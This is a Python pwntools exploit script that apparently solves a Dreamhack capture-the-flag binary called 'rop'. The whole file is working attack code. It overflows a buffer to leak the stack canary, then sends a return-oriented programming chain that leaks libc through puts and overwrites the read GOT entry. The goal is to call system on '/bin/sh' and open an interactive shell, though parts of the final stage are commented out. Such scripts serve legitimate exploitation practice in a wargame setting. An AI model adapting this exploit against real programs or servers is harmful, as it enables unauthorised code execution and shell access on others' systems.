from pwn import *

p = process("./rop")
#p = remote("host3.dreamhack.games",16227)
e = ELF("./rop")
#libc = ELF("./libc.so.6")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

pause()

payload = b''
payload += b'a'*57

p.sendafter(": ",payload)
p.recvuntil(payload)
cnry = b'\x00' +p.recv(7)
print(cnry)

#pr = 0x0000000000400853
#prr = 0x0000000000400851
pr = 0x0000000000027c65
prr = 0x0000000000027c63
#binsh_offset = 0x1d8698
#system_offset = 0x19100
#read_offset = 0x114980
binsh_offset = 0x19604f
system_offset = 0x4c990
read_offset = 0xf7af0

puts_plt = e.plt["puts"]
read_got = e.got["read"]
read_plt = e.plt["read"]

payload = b''
payload += b'a'*56 + cnry + b'a'*8
payload += p64(pr)
payload += p64(read_got)
payload += p64(puts_plt)

payload += p64(pr) + p64(0)
payload += p64(prr) + p64(read_got) + p64(0)
payload += p64(read_plt)

payload += p64(pr) + p64(read_got+8)
payload += p64(read_plt)

p.sendafter(": ",payload)
# read_addr = p.recv(6) + b'\x00\x00' 
# print(f"read addr : {read_addr}")
# read_addr = u64(read_addr)
# libc_base = read_addr - read_offset
# system_addr = libc_base+system_offset

# p.send(p64(system_addr)+b"/bin/sh\x00")


p.interactive()